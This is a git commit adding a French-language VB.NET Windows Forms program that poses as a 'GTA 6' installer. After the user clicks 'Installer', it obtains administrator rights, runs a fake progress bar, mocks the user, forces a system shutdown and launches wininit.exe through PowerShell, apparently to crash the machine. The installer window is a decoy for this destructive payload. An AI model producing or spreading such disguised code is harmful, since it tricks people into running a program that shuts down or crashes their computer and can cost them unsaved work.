1dfe199a0c6827b716c9d35bee705db87cf81064
Jean <63162857+masckmaster2007@users.noreply.github.com>
2023-12-15 21:54:02 +0100

    une tesma

---
+++ GTA 6/Form1.Designer.vb
@@ -0,0 +1,99 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Requise par le Concepteur Windows Form
+    Private components As System.ComponentModel.IContainer
+
+    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
+    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
+    'Ne la modifiez pas à l'aide de l'éditeur de code.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(12, 210)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(75, 23)
+        Me.Button1.TabIndex = 1
+        Me.Button1.Text = "Installer"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 27.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label1.Location = New System.Drawing.Point(78, 9)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(286, 42)
+        Me.Label1.TabIndex = 2
+        Me.Label1.Text = "Installeur GTA 6"
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.Location = New System.Drawing.Point(94, 209)
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.Size = New System.Drawing.Size(336, 23)
+        Me.ProgressBar1.TabIndex = 3
+        '
+        'PictureBox1
+        '
+        Me.PictureBox1.Image = Global.GTA_6.My.Resources.Resources.gta
+        Me.PictureBox1.Location = New System.Drawing.Point(-13, -10)
+        Me.PictureBox1.Name = "PictureBox1"
+        Me.PictureBox1.Size = New System.Drawing.Size(466, 270)
+        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox1.TabIndex = 0
+        Me.PictureBox1.TabStop = False
+        '
+        'Timer1
+        '
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(442, 245)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.Controls.Add(Me.Label1)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.PictureBox1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
+        Me.MaximumSize = New System.Drawing.Size(458, 284)
+        Me.MinimumSize = New System.Drawing.Size(458, 284)
+        Me.Name = "Form1"
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "GTA VI"
+        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents PictureBox1 As PictureBox
+    Friend WithEvents Button1 As Button
+    Friend WithEvents Label1 As Label
+    Friend WithEvents ProgressBar1 As ProgressBar
+    Friend WithEvents Timer1 As Timer
+End Class
---
+++ GTA 6/Form1.vb
@@ -0,0 +1,56 @@
+﻿Imports System.Threading.Thread
+Imports System.IO
+Public Class Form1
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        If My.User.IsInRole(Microsoft.VisualBasic.ApplicationServices.BuiltInRole.Administrator) Then
+            Timer1.Start()
+        Else
+            MsgBox("Veuillez exécuter le programme en tant qu'Administrateur...")
+            RestartElevated()
+        End If
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Button1.Enabled = False
+        My.Settings.run = False
+        While ProgressBar1.Value < 100
+            ProgressBar1.Value += 1
+            Sleep(20)
+        End While
+        Timer1.Stop()
+        LaFin()
+    End Sub
+    Private Sub LaFin()
+        MsgBox("Installation terminée")
+        MsgBox("Ou pas :3")
+        Dim shutdownCommand As String = "shutdown.exe"
+        Dim arguments As String = "/s /t 30 /c ""LE WOKISME"""
+        ' Start the process
+        Process.Start(shutdownCommand, arguments)
+        Sleep(3000)
+        Dim shutdownCommand1 As String = "powershell.exe"
+        Dim arguments1 As String = "wininit.exe"
+        Process.Start(shutdownCommand1, arguments1)
+    End Sub
+    Private Sub RestartElevated()
+        Dim startInfo As New ProcessStartInfo()
+        startInfo.UseShellExecute = True
+        startInfo.WorkingDirectory = Environment.CurrentDirectory
+        startInfo.FileName = Application.ExecutablePath
+        startInfo.Verb = "runas"
+        Try
+            Dim p As Process = Process.Start(startInfo)
+        Catch ex As System.ComponentModel.Win32Exception
+            Return
+        End Try
+
+        My.Settings.run = True
+        Application.[Exit]()
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        If My.User.IsInRole(Microsoft.VisualBasic.ApplicationServices.BuiltInRole.Administrator) And My.Settings.run = True Then
+            Timer1.Start()
+        End If
+    End Sub
+End Class
